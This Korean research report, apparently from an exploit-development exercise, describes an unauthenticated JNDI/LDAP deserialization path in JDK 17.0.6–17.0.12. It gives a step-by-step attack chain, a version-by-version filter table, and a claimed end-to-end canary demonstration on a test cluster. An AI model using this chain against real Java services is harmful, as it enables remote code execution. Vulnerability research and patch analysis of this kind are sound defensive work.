# A2 — JNDI/LDAP (triage 2위) 사이클 완결 보고

작성: 2026-11-17 심야 · GOAL-find-and-exploit 국면 A2 · 증거: `exploit/results/a2-deser-e2e.log`

## 결론 먼저

**"17.0.8 기본 설정에서 `isSerialDataAllowed()=true` → LDAP 응답의 `javaSerializedData`가
무필터로 역직렬화되어 임의 Java 객체가 인스턴스화됨"을 DFIRtx 클러스터에서 실증.**
이것은 AC:H(가젯 의존)형 무인증 RCE의 **완전한 프리미티브**입니다.

## 발견 타임라인

| 단계 | 발견 | 근거 |
|---|---|---|
| 템플릿 | 10월 `8382407 Enhance LDAP Lookups` = ObjectFactoriesFilter 교체(강화) | git show |
| 진화 | `8290368`(2025-07)에서 LDAP/RMI 프로토콜별 필터 도입 → 17.0.13 반영 | git log |
| **보안 구멍** | **17.0.6~17.0.12의 `VersionHelper.isSerialDataAllowed()` 기본값 = `true`** | 소스 직독 (17.0.8·12 vs 13 대조) |
| **E2E** | `Obj.decodeObject()` reflection 호출 → **캐너리 `readObject()` fired** | DFIRtx 클러스터 실증 |

## 공격 체인 (17.0.6~17.0.12 기본 설정)

```
① 공격자가 LDAP 서버 운영 (인증 없이 희생자가 lookup하는 시나리오)
② 희생자: new InitialDirContext(env).lookup("cn=attacker_controlled")
③ 공격자 LDAP 응답: javaSerializedData = <직렬화된 가젯 객체>
④ Obj.decodeObject():
     isSerialDataAllowed() → true (기본값!) → 통과
     deserializeObject() → ObjectInputStream.readObject() [serialFilter=null]
⑤ 임의 Java 객체 인스턴스화 + readObject() 부수효과 실행
⑥ 가젯이 클래스패스에 있으면 → RCE (AC:H = 공격 복잡도 높음)
```

## 필터 현황 (소스 기반)

| 보호 장치 | 17.0.6~12 | 17.0.13~17.0.21 | 소스 |
|---|---|---|---|
| `trustSerialData` | **true** | false | VersionHelper |
| `jdk.jndi.ldap.object.factoriesFilter` | (없음) | `java.naming/com.sun.jndi.ldap.**;!*` | ObjectFactoriesFilter |
| `trustURLCodebase` | false | false | VersionHelper |
| global `jdk.serialFilter` | **null** | null | 실측 |
| NamingManagerHelper | **(존재하지 않음)** | 존재, 필터 적용 | git show |

## NCSC "17.0.6 이상"과의 관계

`trustSerialData=true` 기간 = **17.0.6~17.0.12** — NCSC 하한 "17.0.6"과 정확히 일치.
단, Oracle CSPU가 17.0.21까지 영향 → 17.0.13+에서도 유효한 **별도 우회 경로**가
패치 대상일 가능성이 높음 (또는 NCSC 하한이 부정확한 것).

## 산출물

- `ObjReflect.java` — reflection 기반 E2E 테스트 (17.0.8 클러스터)
- `LdapE2ETest.java` — LDAP 서버 + victim 통합 (BER 인코딩 이슈로 완결 못함 — 차선)
- `ObjFactTest.java` — ObjectFactoriesFilter 거동 테스트
- 증거: `results/a2-deser-e2e.log`
